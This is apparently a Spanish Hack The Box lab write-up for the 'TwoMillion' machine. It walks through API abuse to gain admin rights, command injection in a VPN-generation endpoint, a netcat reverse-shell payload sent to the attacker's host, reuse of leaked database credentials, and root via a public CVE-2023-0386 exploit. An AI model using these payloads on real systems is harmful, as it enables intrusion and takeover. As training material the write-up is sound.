---
title: TwoMillion
date: 2024-06-22 20:11:00 +0800
lang: es-ES
author: Justice-Reaper
categories:
  - Hackthebox
  - Linux
tags:
  - Api Abusing
  - Kernel Exploitation
  - CVE-2023-0386
  - Information Leakage
  - Javascript
  - Command Injection    
image:
  path: /assets/img/TwoMillion/TwoMillion.png
---

## Skills

- Abusing declared Javascript functions from the browser console
- Abusing the API to generate a valid invite code
- Abusing the API to elevate our privilege to administrator
- Command injection via poorly designed API functionality
- Information Leakage
- Privilege Escalation via Kernel Exploitation (CVE-2023-0386) - OverlayFS Vulnerability

## Certificaciones

- eWPT
- OSWE

## Descripción

`TwoMillion` es una máquina `easy linux` donde estaremos vulnerando la máquina a través de su `api`, listaremos sus endpoints`endpoints` y los explotaremos convirtiéndonos en usuario `administrador` y obteniendo acceso a la máquina víctima mediante un `command injection`. Una vez dentro escalaremos privilegios gracias a unas `credenciales` de base de datos y posteriormente explotaremos el `CVE-2023-0386` obteniendo así el usuario root

---

## Reconocimiento

Se comprueba que la máquina está activa y se determina su sistema operativo, el ttl de las máquinas `linux` suele ser `64`, en este caso hay un nodo intermediario que hace que el ttl disminuya en una unidad

```
# ping 10.129.229.66
PING 10.129.229.66 (10.129.229.66) 56(84) bytes of data.
64 bytes from 10.129.229.66: icmp_seq=1 ttl=63 time=41.8 ms
64 bytes from 10.129.229.66: icmp_seq=2 ttl=63 time=39.5 ms
^C
--- 10.129.229.66 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1003ms
rtt min/avg/max/mdev = 39.457/40.627/41.797/1.170 ms
```

### Nmap

Se va a realizar un escaneo de todos los puertos abiertos en el protocolo TCP a través de nmap

```
# sudo nmap -p- --open --min-rate 5000 -sS -n -Pn -v 10.129.229.66 -oG openPorts
[sudo] password for justice-reaper: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-22 11:58 CEST
Initiating SYN Stealth Scan at 11:58
Scanning 10.129.229.66 [65535 ports]
Discovered open port 80/tcp on 10.129.229.66
Discovered open port 22/tcp on 10.129.229.66
Completed SYN Stealth Scan at 11:58, 11.31s elapsed (65535 total ports)
Nmap scan report for 10.129.229.66
Host is up (0.051s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 11.41 seconds
           Raw packets sent: 65535 (2.884MB) | Rcvd: 65535 (2.621MB)
```

Se procede a realizar un análisis de `detección` de `servicios` y la `identificación` de `versiones` utilizando los puertos abiertos encontrados

```
# nmap -sCV -p22,80 10.129.229.66 -oN services
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-22 12:00 CEST
Nmap scan report for 10.129.229.66
Host is up (0.053s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx
|_http-title: Did not follow redirect to http://2million.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.44 seconds
```

### Web Enumeration

Nos dirigimos a la página web y se visualiza lo siguiente:

![](/assets/img/TwoMillion/image_1.png)

Lo cual quiere decir que se está aplicacando `virtual hosting`, para poder acceder a la web debemos añadir `2million.htb` a nuestro `/etc/hosts`

```
127.0.0.1       localhost
127.0.1.1       Kali-Linux
10.129.229.66   2million.htb

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

Ahora al acceder a  la web vemos lo siguiente

![](/assets/img/TwoMillion/image_2.png)

Vamos a intentar registrarnos desde la parte de join

![](/assets/img/TwoMillion/image_3.png)

Parece que nos está invitando a encontrar una vulnerabilidad en el sitio web para poder registrarnos

![](/assets/img/TwoMillion/image_4.png)

En el código de la página web poder ver una función de javascript, en ella podemos ver la ruta de la api `/api/v1/invite/verify`

![](/assets/img/TwoMillion/image_5.png)

Buscando en el código fuente nos encontramos este archivo .js en la ruta `http://2million.htb/js/inviteapi.min.js`. El archivo no estará en un formato fácilmente legible pero podemos usar chatgpt para que lo represente correctamente.

Estamos viento una nueva ruta `/api/v1/invite/how/to/generate`

```
function verifyInviteCode(code) {
    var formData = {"code": code};
    $.ajax({
        type: "POST",
        dataType: "json",
        data: formData,
        url: '/api/v1/invite',
        success: function(response) {
            console.log(response);
        },
        error: function(response) {
            console.log(response);
        }
    });
}

function makeInviteCode() {
    $.ajax({
        type: "POST",
        dataType: "json",
        url: '/api/v1/invite/how/to/generate',
        success: function(response) {
            console.log(response);
        },
        error: function(response) {
            console.log(response);
        }
    });
}
```

Al hacerle un petición a este endpoint de la api obtenemos un mensaje

```
# curl -X POST 'http://2million.htb/api/v1/invite/how/to/generate'   
{"0":200,"success":1,"data":{"data":"Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb \/ncv\/i1\/vaivgr\/trarengr","enctype":"ROT13"},"hint":"Data is encrypted ... We should probbably check the encryption type in order to decrypt it..."} 
```

Existe otra forma para listar las funciones en el navegador, para ello debemos abrirnos la consola del navegador y poner el comando `this`, posteriormente llamamos al nombre de la función `makeInviteCode()`

![](/assets/img/TwoMillion/image_6.png)

Podemos descifrar el mensaje cifrado con `rot13` desde cualquier página web. El mensaje nos dice que debemos hacer una petición `POST` a la ruta `http://2million.htb/api/v1/invite/generate`

![](/assets/img/TwoMillion/image_7.png)

Al hacer la petición `POST` obtenemos una cadena en `base64`

```
# curl -X POST http://2million.htb/api/v1/invite/generate         
{"0":200,"success":1,"data":{"code":"VUszOE4tOENFVEItSlpWQjEtR0JSV0g=","format":"encoded"}}
```

Desciframos la cadena de `base64` y obtenemos el `código de invitación`

```
# echo VUszOE4tOENFVEItSlpWQjEtR0JSV0g= | base64 -d
UK38N-8CETB-JZVB1-GBRWH
```

Introducimos el código de invitación

![](/assets/img/TwoMillion/image_8.png)

Registramos nuestro usuario

![](/assets/img/TwoMillion/image_9.png)

Nos logueamos en la página web

![](/assets/img/TwoMillion/image_10.png)

Al acceder a la web en la parte de `Labs` podemos descargarnos una vpn

![](/assets/img/TwoMillion/image_11.png)

Si miramos el trafico al pulsar sobre estos botones obtenemos dos nuevas rutas, `http://2million.htb/api/v1/user/vpn/regenerate` y `http://2million.htb/api/v1/user/vpn/generate`

![](/assets/img/TwoMillion/image_12.png)

![](/assets/img/TwoMillion/image_13.png)

En la página web no he encontrado nada más que sea de interés, no hay subdominios o nuevas rutas. Por lo tanto vamos a centrarnos en `enumerar` la `api`. Lo primero que necesitamos en obtener nuestro `token de sesión` para poder hacer la petición como si estuviésemos logueados

![](/assets/img/TwoMillion/image_14.png)

Posteriormente debemos realizar esta `petición` a la `api` para `enumerar` todos sus `endpoints`

```
# curl -s http://2million.htb/api/v1 -H 'Cookie: PHPSESSID=hmjt1ugmv3dcklja6k01l95l6q' | jq
{
  "v1": {
    "user": {
      "GET": {
        "/api/v1": "Route List",
        "/api/v1/invite/how/to/generate": "Instructions on invite code generation",
        "/api/v1/invite/generate": "Generate invite code",
        "/api/v1/invite/verify": "Verify invite code",
        "/api/v1/user/auth": "Check if user is authenticated",
        "/api/v1/user/vpn/generate": "Generate a new VPN configuration",
        "/api/v1/user/vpn/regenerate": "Regenerate VPN configuration",
        "/api/v1/user/vpn/download": "Download OVPN file"
      },
      "POST": {
        "/api/v1/user/register": "Register a new user",
        "/api/v1/user/login": "Login with existing user"
      }
    },
    "admin": {
      "GET": {
        "/api/v1/admin/auth": "Check if user is admin"
      },
      "POST": {
        "/api/v1/admin/vpn/generate": "Generate VPN for specific user"
      },
      "PUT": {
        "/api/v1/admin/settings/update": "Update user settings"
      }
    }
  }
}
```

## Api Exploitation

Vamos a cambiar nuestro usuario a `administrador` mediante este endpoint `http://2million.htb/api/v1/admin/settings/update`

```
# curl -X PUT http://2million.htb/api/v1/admin/settings/update -H 'Cookie: PHPSESSID=hmjt1ugmv3dcklja6k01l95l6q' -H 'Content-Type: application/json' -d '{"email":"justice-reaper@gmail.com", "is_admin":1}'
{"id":13,"username":"justice-reaper","is_admin":1}  
```

Verificamos que seamos usuario administradores

```
# curl -s http://2million.htb/api/v1/admin/auth -H 'Cookie: PHPSESSID=hmjt1ugmv3dcklja6k01l95l6q'   
{"message":true}                       
```

Como somos usuarios administradores podemos generar una `vpn` enviando una petición por `POST` a `http://2million.htb/api/v1/admin/vpn/generate`

```
# curl -s -X POST http://2million.htb/api/v1/admin/vpn/generate -H 'Cookie: PHPSESSID=hmjt1ugmv3dcklja6k01l95l6q'  -H 'Content-Type: application/json' -d '{"username":"justice-reaper"}'   
```

Debemos pensar que si la `vpn` está siendo generada a mediante un comando en `linux` y este comando está recibiendo por parámetro el `username`. Nosotros podemos intentar ejecutar comandos inyectándolos en ese campo

```
# curl -s -X POST http://2million.htb/api/v1/admin/vpn/generate -H 'Cookie: PHPSESSID=hmjt1ugmv3dcklja6k01l95l6q'  -H 'Content-Type: application/json' -d '{"username":"justice-reaper ; whoami #"}'  
www-data
```

Efectivamente, tenemos un `remote command execution`, el `;` lo usamos para que después del comando anterior se `ejecute` otro comando y el `#` lo usamos para `comentar` lo siguiente, debido a que puede haber más parámetros después del username

## Intrusión

Podemos intentar obtener una `reverse shell`, lo primero en ver si tenemos traza, para ello ejecutamos el siguiente comando

```
# curl -s -X POST http://2million.htb/api/v1/admin/vpn/generate -H 'Cookie: PHPSESSID=hmjt1ugmv3dcklja6k01l95l6q'  -H 'Content-Type: application/json' -d '{"username":"justice-reaper ; ping 10.10.16.6 #"}'
```

Nos ponemos en escucha de trazas `icmp` y comprobamos que efectivamente tenemos traza

```
# sudo tcpdump -i tun0 icmp  
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
14:37:57.156809 IP 2million.htb > 10.10.16.6: ICMP echo request, id 1, seq 1729, length 64
14:37:57.156840 IP 10.10.16.6 > 2million.htb: ICMP echo reply, id 1, seq 1729, length 64
14:37:57.422913 IP 2million.htb > 10.10.16.6: ICMP echo request, id 2, seq 32, length 64
14:37:57.422941 IP 10.10.16.6 > 2million.htb: ICMP echo reply, id 2, seq 32, length 64
14:37:58.158258 IP 2million.htb > 10.10.16.6: ICMP echo request, id 1, seq 1730, length 64
14:37:58.158294 IP 10.10.16.6 > 2million.htb: ICMP echo reply, id 1, seq 1730, length 64
14:37:58.423214 IP 2million.htb > 10.10.16.6: ICMP echo request, id 2, seq 33, length 64
14:37:58.423247 IP 10.10.16.6 > 2million.htb: ICMP echo reply, id 2, seq 33, length 64
^C
8 packets captured
8 packets received by filter
0 packets dropped by kernel
```

Para obtener una `reverse shell` ejecutamos el siguiente comando

```
# curl -s -X POST http://2million.htb/api/v1/admin/vpn/generate -H 'Cookie: PHPSESSID=hmjt1ugmv3dcklja6k01l95l6q'  -H 'Content-Type: application/json' -d '{"username":"justice-reaper ; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.16.6 443 >/tmp/f #"}'      
```

Nos ponemos en escucha mediante `netcat`

```
# nc -nlvp 443
```

Obtenemos las `dimensiones` de nuestra pantalla 

```
# stty size
45 183
```

Efectuamos el tratamiento a la `TTY`

```
# script /dev/null -c bash
[ENTER]
[CTRL + Z]
# stty raw -echo; fg
[ENTER]
# reset xterm
[ENTER]
# export TERM=xterm
[ENTER]
# export SHELL=bash
[ENTER]
# stty rows 45 columns 183
[ENTER]
```

## Privilege Escalation

Vamos a `enumerar` el sistema operativo usando `linpeas.sh`, podemos descargarlo desde su `github` oficial [https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS)

```
# wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
```

Desde nuestra máquina atacante nos ponemos en `escucha` en el mismo directorio donde se encuentra `linpeas.sh`

```
# python -m http.server 80
```

Nos lo llevamos a la máquina víctima ejecutando este comando

```
www-data@2million:/tmp/scripts$ wget http://10.10.16.6/linpeas.sh
```

Ejecutamos linpeas.sh y vemos que hay unas credenciales en la ruta `/var/www/html/.env`

```
╔══════════╣ Analyzing Env Files (limit 70)
-rw-r--r-- 1 root root 87 Jun  2  2023 /var/www/html/.env
DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123
```

Podemos reutilizar las `credenciales` para convertirnos en el usuario `admin`

```
www-data@2million:/tmp/scripts$ su admin
Password: 
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.
```

Una vez convertidos en el usuario `admin` ejecutamos `linpeas.sh` de nuevo, me ha llamado la atención que tenemos un apartado de `mails`

```
╔══════════╣ Mails (limit 50)
      271      4 -rw-r--r--   1 admin    admin         540 Jun  2  2023 /var/mail/admin
      271      4 -rw-r--r--   1 admin    admin         540 Jun  2  2023 /var/spool/mail/admin
```

Al parecer hay una vulnerabilidad, la cual si no ha sido parcheada podemos explotar

```
admin@2million:/var/mail$ cat admin
From: ch4p <ch4p@2million.htb>
To: admin <admin@2million.htb>
Cc: g0blin <g0blin@2million.htb>
Subject: Urgent: Patch System OS
Date: Tue, 1 June 2023 10:45:22 -0700
Message-ID: <9876543210@2million.htb>
X-Mailer: ThunderMail Pro 5.2

Hey admin,

I'm know you're working as fast as you can to do the DB migration. While we're partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty. We can't get popped by that.

HTB Godfather
```

Investigamos nos encontramos este exploit [https://www.vicarius.io/vsociety/posts/cve-2023-0386-a-linux-kernel-bug-in-overlayfs](https://www.vicarius.io/vsociety/posts/cve-2023-0386-a-linux-kernel-bug-in-overlayfs) que afecta a las versiones de `kernel` inferiores a la `6.2`

Nos descargamos el `exploit` en nuestra máquina `atacante`, lo `comprimimos` con zip y nos ponemos en `escucha` con python por el puerto 80

```
# git clone https://github.com/sxlmnwb/CVE-2023-0386.git
# zip -r exploit.zip CVE-2023-0386
# python -m http.server 80
```

Desde la máquina víctima `descargamos` el archivo, lo `descomprimimos` y accedemos al `directorio`

```
admin@2million:/tmp/exploit$ wget http://10.10.16.6/exploit.zip
admin@2million:/tmp/exploit$ unzip exploit.zip
admin@2million:/tmp/exploit$ cd /CVE-2023-0386
```

Una vez dentro del directorio debemos hacer un `make all`

Para el siguiente paso debemos tener abiertas `2 terminales` en la máquina víctima en ese directorio. Desde la `terminal 1` ejecutamos el comando `admin@2million:/tmp/exploit/CVE-2023-0386$ ./fuse ./ovlcap/lower ./gc` y desde la `terminal 2` ejecutamos `admin@2million:/tmp/exploit/CVE-2023-0386$ ./exp`

El output de la `terminal 1` debería verse así

```
admin@2million:/tmp/exploit/CVE-2023-0386$ ./fuse ./ovlcap/lower ./gc
[+] len of gc: 0x3ee0
[+] readdir
[+] getattr_callback
/file
[+] open_callback
/file
[+] read buf callback
offset 0
size 16384
path /file
[+] open_callback
/file
[+] open_callback
/file
[+] ioctl callback
path /file
cmd 0x80086601
```

El output de la`terminal 2` debería verse así y deberíamos ser usuario `root`

```
admin@2million:/tmp/exploit/CVE-2023-0386$ ./exp
uid:1000 gid:1000
[+] mount success
total 8
drwxrwxr-x 1 root   root     4096 Jun 22 17:32 .
drwxrwxr-x 6 root   root     4096 Jun 22 17:32 ..
-rwsrwxrwx 1 nobody nogroup 16096 Jan  1  1970 file
[+] exploit success!
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.
root@2million:/tmp/exploit/CVE-2023-0386# whoami
root
```

## Secret Message

En el directorio `root` nos encontramos con un archivo `.json`

```
root@2million:/root# cat thank_you.json 
{"encoding": "url", "data": "%7B%22encoding%22:%20%22hex%22,%20%22data%22:%20%227b22656e6372797074696f6e223a2022786f72222c2022656e6372707974696f6e5f6b6579223a20224861636b546865426f78222c2022656e636f64696e67223a2022626173653634222c202264617461223a20224441514347585167424345454c43414549515173534359744168553944776f664c5552765344676461414152446e51634454414746435145423073674230556a4152596e464130494d556745596749584a51514e487a7364466d494345535145454238374267426942685a6f4468595a6441494b4e7830574c526844487a73504144594848547050517a7739484131694268556c424130594d5567504c525a594b513848537a4d614244594744443046426b6430487742694442306b4241455a4e527741596873514c554543434477424144514b4653305046307337446b557743686b
7243516f464d306858596749524a41304b424470494679634347546f4b41676b344455553348423036456b4a4c4141414d4d5538524a674952446a41424279344b574334454168393048776f334178786f44777766644141454e4170594b67514742585159436a456345536f4e426b736a41524571414130385151594b4e774246497745636141515644695952525330424857674f42557374427842735a58494f457777476442774e4a30384f4c524d61537a594e4169734246694550424564304941516842437767424345454c45674e497878594b6751474258514b45437344444767554577513653424571436c6771424138434d5135464e67635a50454549425473664353634c4879314245414d31476777734346526f416777484f416b484c52305a5041674d425868494243774c574341414451386e52516f73547830774551595a5051304c495170594b524d47537a49644379594f4653305046776f345342457454776774457841454f676b4a596734574c4545544754734f414445634553635041676430447863744741776754304d2f4f7738414e6763644f6b31444844464944534d5a48576748444267674452636e4331677044304d4f4f68344d4d4141574a51514e48335166445363644857674944515537486751324268636d515263444a6745544a7878594b5138485379634444433444433267414551353041416f734368786d5153594b4e7742464951635a4a41304742544d4e525345414654674e4268387844456c6943686b7243554d474e51734e4b7745646141494d425355644144414b48475242416755775341413043676f78515241415051514a59674d644b524d4e446a424944534d635743734f4452386d4151633347783073515263456442774e4a3038624a773050446a63634444514b57434550467734344241776c4368597242454d6650416b5259676b4e4c51305153794141444446504469454445516f36484555684142556c464130434942464c534755734a304547436a634152534d42484767454651346d45555576436855714242464c4f7735464e67636461436b434344383844536374467a424241415135425241734267777854554d6650416b4c4b5538424a785244445473615253414b4553594751777030474151774731676e42304d6650414557596759574b784d47447a304b435364504569635545515578455574694e68633945304d494f7759524d4159615052554b42446f6252536f4f4469314245414d314741416d5477776742454d644d526f6359676b5a4b684d4b4348514841324941445470424577633148414d744852566f414130506441454c4d5238524f67514853794562525459415743734f445238394268416a4178517851516f464f676354497873646141414e4433514e4579304444693150517a777853415177436c67684441344f4f6873414c685a594f424d4d486a424943695250447941414630736a4455557144673474515149494e7763494d674d524f776b47443351634369554b44434145455564304351736d547738745151594b4d7730584c685a594b513858416a634246534d62485767564377353043776f334151776b424241596441554d4c676f4c5041344e44696449484363625744774f51776737425142735a5849414242454f637874464e67425950416b47537a6f4e48545a504779414145783878476b6c694742417445775a4c497731464e5159554a45454142446f6344437761485767564445736b485259715477776742454d4a4f78304c4a67344b49515151537a734f525345574769305445413433485263724777466b51516f464a78674d4d41705950416b47537a6f4e48545a504879305042686b31484177744156676e42304d4f4941414d4951345561416b434344384e467a464457436b50423073334767416a4778316f41454d634f786f4a4a6b385049415152446e514443793059464330464241353041525a69446873724242415950516f4a4a30384d4a304543427a6847623067344554774a517738784452556e4841786f4268454b494145524e7773645a477470507a774e52516f4f47794d3143773457427831694f78307044413d3d227d%22%7D"}
```

Para descifrarlos debemos quitar el `urlencode` y para ello usaremos `php interactivo`

```
# php --interactive
Interactive shell

php > echo urldecode("%7B%22encoding%22:%20%22hex%22,%20%22data%22:%20%227b22656e6372797074696f6e223a2022786f72222c2022656e6372707974696f6e5f6b6579223a20224861636b546865426f78222c2022656e636f64696e67223a2022626173653634222c202264617461223a20224441514347585167424345454c43414549515173534359744168553944776f664c5552765344676461414152446e51634454414746435145423073674230556a4152596e464130494d556745596749584a51514e487a7364466d494345535145454238374267426942685a6f4468595a6441494b4e7830574c526844487a73504144594848547050517a7739484131694268556c424130594d5567504c525a594b513848537a4d614244594744443046426b6430487742694442306b4241455a4e527741596873514c554543434477424144514b4653305046307337446b557743686b7243516f464d306858596749524a41304b424470494679634347546f4b41676b344455553348423036456b4a4c4141414d4d5538524a674952446a41424279344b574334454168393048776f334178786f44777766644141454e4170594b67514742585159436a456345536f4e426b736a41524571414130385151594b4e774246497745636141515644695952525330424857674f42557374427842735a58494f457777476442774e4a30384f4c524d61537a594e4169734246694550424564304941516842437767424345454c45674e497878594b6751474258514b45437344444767554577513653424571436c6771424138434d5135464e67635a50454549425473664353634c4879314245414d31476777734346526f416777484f416b484c52305a5041674d425868494243774c574341414451386e52516f73547830774551595a5051304c495170594b524d47537a49644379594f4653305046776f345342457454776774457841454f676b4a596734574c4545544754734f414445634553635041676430447863744741776754304d2f4f7738414e6763644f6b31444844464944534d5a48576748444267674452636e4331677044304d4f4f68344d4d4141574a51514e48335166445363644857674944515537486751324268636d515263444a6745544a7878594b5138485379634444433444433267414551353041416f734368786d5153594b4e7742464951635a4a41304742544d4e525345414654674e4268387844456c6943686b7243554d474e51734e4b7745646141494d425355644144414b48475242416755775341413043676f78515241415051514a59674d644b524d4e446a424944534d635743734f4452386d4151633347783073515263456442774e4a3038624a773050446a63634444514b57434550467734344241776c4368597242454d6650416b5259676b4e4c51305153794141444446504469454445516f36484555684142556c464130434942464c534755734a304547436a634152534d42484767454651346d45555576436855714242464c4f7735464e67636461436b434344383844536374467a424241415135425241734267777854554d6650416b4c4b5538424a785244445473615253414b4553594751777030474151774731676e42304d6650414557596759574b784d47447a304b435364504569635545515578455574694e68633945304d494f7759524d4159615052554b42446f6252536f4f4469314245414d314741416d5477776742454d644d526f6359676b5a4b684d4b4348514841324941445470424577633148414d744852566f414130506441454c4d5238524f67514853794562525459415743734f445238394268416a4178517851516f464f676354497873646141414e4433514e4579304444693150517a777853415177436c67684441344f4f6873414c685a594f424d4d486a424943695250447941414630736a4455557144673474515149494e7763494d674d524f776b47443351634369554b44434145455564304351736d547738745151594b4d7730584c685a594b513858416a634246534d62485767564377353043776f334151776b424241596441554d4c676f4c5041344e44696449484363625744774f51776737425142735a5849414242454f637874464e67425950416b47537a6f4e48545a504779414145783878476b6c694742417445775a4c497731464e5159554a45454142446f6344437761485767564445736b485259715477776742454d4a4f78304c4a67344b49515151537a734f525345574769305445413433485263724777466b51516f464a78674d4d41705950416b47537a6f4e48545a504879305042686b31484177744156676e42304d4f4941414d4951345561416b434344384e467a464457436b50423073334767416a4778316f41454d634f786f4a4a6b385049415152446e514443793059464330464241353041525a69446873724242415950516f4a4a30384d4a304543427a6847623067344554774a517738784452556e4841786f4268454b494145524e7773645a477470507a774e52516f4f47794d3143773457427831694f78307044413d3d227d%22%7D");
{"encoding": "hex", "data": "7b22656e6372797074696f6e223a2022786f72222c2022656e6372707974696f6e5f6b6579223a20224861636b546865426f78222c2022656e636f64696e67223a2022626173653634222c202264617461223a20224441514347585167424345454c43414549515173534359744168553944776f664c5552765344676461414152446e51634454414746435145423073674230556a4152596e464130494d556745596749584a51514e487a7364466d494345535145454238374267426942685a6f4468595a6441494b4e7830574c526844487a73504144594848547050517a7739484131694268556c424130594d5567504c525a594b513848537a4d614244594744443046426b6430487742694442306b4241455a4e527741596873514c554543434477424144514b4653305046307337446b557743686b7243516f464d306858596749524a41304b424470494679634347546f4b41676b344455553348423036456b4a4c4141414d4d5538524a674952446a41424279344b574334454168393048776f334178786f44777766644141454e4170594b67514742585159436a456345536f4e426b736a41524571414130385151594b4e774246497745636141515644695952525330424857674f42557374427842735a58494f457777476442774e4a30384f4c524d61537a594e4169734246694550424564304941516842437767424345454c45674e497878594b6751474258514b45437344444767554577513653424571436c6771424138434d5135464e67635a50454549425473664353634c4879314245414d31476777734346526f416777484f416b484c52305a5041674d425868494243774c574341414451386e52516f73547830774551595a5051304c495170594b524d47537a49644379594f4653305046776f345342457454776774457841454f676b4a596734574c4545544754734f414445634553635041676430447863744741776754304d2f4f7738414e6763644f6b31444844464944534d5a48576748444267674452636e4331677044304d4f4f68344d4d4141574a51514e48335166445363644857674944515537486751324268636d515263444a6745544a7878594b5138485379634444433444433267414551353041416f734368786d5153594b4e7742464951635a4a41304742544d4e525345414654674e4268387844456c6943686b7243554d474e51734e4b7745646141494d425355644144414b48475242416755775341413043676f78515241415051514a59674d644b524d4e446a424944534d635743734f4452386d4151633347783073515263456442774e4a3038624a773050446a63634444514b57434550467734344241776c4368597242454d6650416b5259676b4e4c51305153794141444446504469454445516f36484555684142556c464130434942464c534755734a304547436a634152534d42484767454651346d45555576436855714242464c4f7735464e67636461436b434344383844536374467a424241415135425241734267777854554d6650416b4c4b5538424a785244445473615253414b4553594751777030474151774731676e42304d6650414557596759574b784d47447a304b435364504569635545515578455574694e68633945304d494f7759524d4159615052554b42446f6252536f4f4469314245414d314741416d5477776742454d644d526f6359676b5a4b684d4b4348514841324941445470424577633148414d744852566f414130506441454c4d5238524f67514853794562525459415743734f445238394268416a4178517851516f464f676354497873646141414e4433514e4579304444693150517a777853415177436c67684441344f4f6873414c685a594f424d4d486a424943695250447941414630736a4455557144673474515149494e7763494d674d524f776b47443351634369554b44434145455564304351736d547738745151594b4d7730584c685a594b513858416a634246534d62485767564377353043776f334151776b424241596441554d4c676f4c5041344e44696449484363625744774f51776737425142735a5849414242454f637874464e67425950416b47537a6f4e48545a504779414145783878476b6c694742417445775a4c497731464e5159554a45454142446f6344437761485767564445736b485259715477776742454d4a4f78304c4a67344b49515151537a734f525345574769305445413433485263724777466b51516f464a78674d4d41705950416b47537a6f4e48545a504879305042686b31484177744156676e42304d4f4941414d4951345561416b434344384e467a464457436b50423073334767416a4778316f41454d634f786f4a4a6b385049415152446e514443793059464330464241353041525a69446873724242415950516f4a4a30384d4a304543427a6847623067344554774a517738784452556e4841786f4268454b494145524e7773645a477470507a774e52516f4f47794d3143773457427831694f78307044413d3d227d"}
```

Ahora hemos obtenidos una `cadena` en `hexadecimal`, para `descifrarlo` vamos a utilizar el comando `xxd -ps -r`

```
# echo "7b22656e6372797074696f6e223a2022786f72222c2022656e6372707974696f6e5f6b6579223a20224861636b546865426f78222c2022656e636f64696e67223a2022626173653634222c202264617461223a20224441514347585167424345454c43414549515173534359744168553944776f664c5552765344676461414152446e51634454414746435145423073674230556a4152596e464130494d556745596749584a51514e487a7364466d494345535145454238374267426942685a6f4468595a6441494b4e7830574c526844487a73504144594848547050517a7739484131694268556c424130594d5567504c525a594b513848537a4d614244594744443046426b6430487742694442306b4241455a4e527741596873514c554543434477424144514b4653305046307337446b557743686b7243516f464d306858596749524a41304b424470494679634347546f4b41676b344455553348423036456b4a4c4141414d4d5538524a674952446a41424279344b574334454168393048776f334178786f44777766644141454e4170594b67514742585159436a456345536f4e426b736a41524571414130385151594b4e774246497745636141515644695952525330424857674f42557374427842735a58494f457777476442774e4a30384f4c524d61537a594e4169734246694550424564304941516842437767424345454c45674e497878594b6751474258514b45437344444767554577513653424571436c6771424138434d5135464e67635a50454549425473664353634c4879314245414d31476777734346526f416777484f416b484c52305a5041674d425868494243774c574341414451386e52516f73547830774551595a5051304c495170594b524d47537a49644379594f4653305046776f345342457454776774457841454f676b4a596734574c4545544754734f414445634553635041676430447863744741776754304d2f4f7738414e6763644f6b31444844464944534d5a48576748444267674452636e4331677044304d4f4f68344d4d4141574a51514e48335166445363644857674944515537486751324268636d515263444a6745544a7878594b5138485379634444433444433267414551353041416f734368786d5153594b4e7742464951635a4a41304742544d4e525345414654674e4268387844456c6943686b7243554d474e51734e4b7745646141494d425355644144414b48475242416755775341413043676f78515241415051514a59674d644b524d4e446a424944534d635743734f4452386d4151633347783073515263456442774e4a3038624a773050446a63634444514b57434550467734344241776c4368597242454d6650416b5259676b4e4c51305153794141444446504469454445516f36484555684142556c464130434942464c534755734a304547436a634152534d42484767454651346d45555576436855714242464c4f7735464e67636461436b434344383844536374467a424241415135425241734267777854554d6650416b4c4b5538424a785244445473615253414b4553594751777030474151774731676e42304d6650414557596759574b784d47447a304b435364504569635545515578455574694e68633945304d494f7759524d4159615052554b42446f6252536f4f4469314245414d314741416d5477776742454d644d526f6359676b5a4b684d4b4348514841324941445470424577633148414d744852566f414130506441454c4d5238524f67514853794562525459415743734f445238394268416a4178517851516f464f676354497873646141414e4433514e4579304444693150517a777853415177436c67684441344f4f6873414c685a594f424d4d486a424943695250447941414630736a4455557144673474515149494e7763494d674d524f776b47443351634369554b44434145455564304351736d547738745151594b4d7730584c685a594b513858416a634246534d62485767564377353043776f334151776b424241596441554d4c676f4c5041344e44696449484363625744774f51776737425142735a5849414242454f637874464e67425950416b47537a6f4e48545a504779414145783878476b6c694742417445775a4c497731464e5159554a45454142446f6344437761485767564445736b485259715477776742454d4a4f78304c4a67344b49515151537a734f525345574769305445413433485263724777466b51516f464a78674d4d41705950416b47537a6f4e48545a504879305042686b31484177744156676e42304d4f4941414d4951345561416b434344384e467a464457436b50423073334767416a4778316f41454d634f786f4a4a6b385049415152446e514443793059464330464241353041525a69446873724242415950516f4a4a30384d4a304543427a6847623067344554774a517738784452556e4841786f4268454b494145524e7773645a477470507a774e52516f4f47794d3143773457427831694f78307044413d3d227d" | xxd -ps -r
